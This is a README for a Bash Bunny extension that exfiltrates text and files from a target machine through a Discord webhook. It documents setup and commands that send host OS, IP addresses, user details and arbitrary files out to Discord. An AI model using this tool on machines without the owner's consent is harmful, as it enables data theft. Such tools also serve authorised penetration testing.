<div align="center">

# Discord Exfiltration

![Bash](https://img.shields.io/badge/Shell_Script-121011?style=for-the-badge&logo=gnu-bash&logoColor=white)
![Quack](https://img.shields.io/badge/Ducky_Script-121011?style=for-the-badge&logo=duck&logoColor=white)

A discord exfiltration extension

[Documentation](#documentation) • [Changelog](#changelog) • [Contributing](#contributing) • [License](#license)  . [Support](#support)


**This bashbunny extension provide exfiltration of text and files through discord webhook**
</div>

<img width="1000" alt="demoGif" src="https://raw.githubusercontent.com/quentinlamamy/bashbunny/main/img/discordExfiltration.gif"/>

# Documentation

>To use this extension, you need to create a webhook on discord and get the webhook id and token
During your setup steps, you need to set the DISCORD_WEBHOOK_ID and DISCORD_WEBHOOK_TOKEN variables

```bash
DISCORD_WEBHOOK_ID="<DISCORD_WEBHOOK_ID>"
DISCORD_WEBHOOK_TOKEN="<DISCORD_WEBHOOK_TOKEN>"
```

### DISCORD INIT

Initialize the exfiltration session by posting an embed message on discord with host information
This command need ```$BB_HOST_OS, $BB_HOST_IP_V4, $BB_HOST_IP_V6, BB_HOST_IP_USER``` variables to be set (Set by default if you use my OSX extension)

## DISCORD SEND MSG

Send a message to discord via webhook

```bash
DISCORD SEND MSG $yourMessage
```

## DISCORD SEND FILE

Send a file to discord via webhook
```bash
DISCORD SEND FILE $yourFilePath
```

# Changelog
v1.0 : 
* :tada: Release on 2023/07/31

# Contributing
A bug ? An idea of feature ? [Fill an issue on github](https://github.com/quentinlamamy/bashbunny/issues)

# License
<p xmlns:cc="http://creativecommons.org/ns#" xmlns:dct="http://purl.org/dc/terms/"><a property="dct:title" rel="cc:attributionURL" href="https://github.com/quentinlamamy/bashbunny/blob/main/extensions/discord/discord.sh">Bashbunny discord extension</a> by <a rel="cc:attributionURL dct:creator" property="cc:attributionName" href="https://github.com/quentinlamamy">Quentin Lamamy</a> is licensed under <a href="http://creativecommons.org/licenses/by-nc-sa/4.0/?ref=chooser-v1" target="_blank" rel="license noopener noreferrer" style="display:inline-block;">CC BY-NC-SA 4.0<img style="height:22px!important;margin-left:3px;vertical-align:text-bottom;" src="https://mirrors.creativecommons.org/presskit/icons/cc.svg?ref=chooser-v1"><img style="height:22px!important;margin-left:3px;vertical-align:text-bottom;" src="https://mirrors.creativecommons.org/presskit/icons/by.svg?ref=chooser-v1"><img style="height:22px!important;margin-left:3px;vertical-align:text-bottom;" src="https://mirrors.creativecommons.org/presskit/icons/nc.svg?ref=chooser-v1"><img style="height:22px!important;margin-left:3px;vertical-align:text-bottom;" src="https://mirrors.creativecommons.org/presskit/icons/sa.svg?ref=chooser-v1"></a></p>

# Support
<a href="https://www.buymeacoffee.com/quentinlamamy" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="41" width="174"></a>
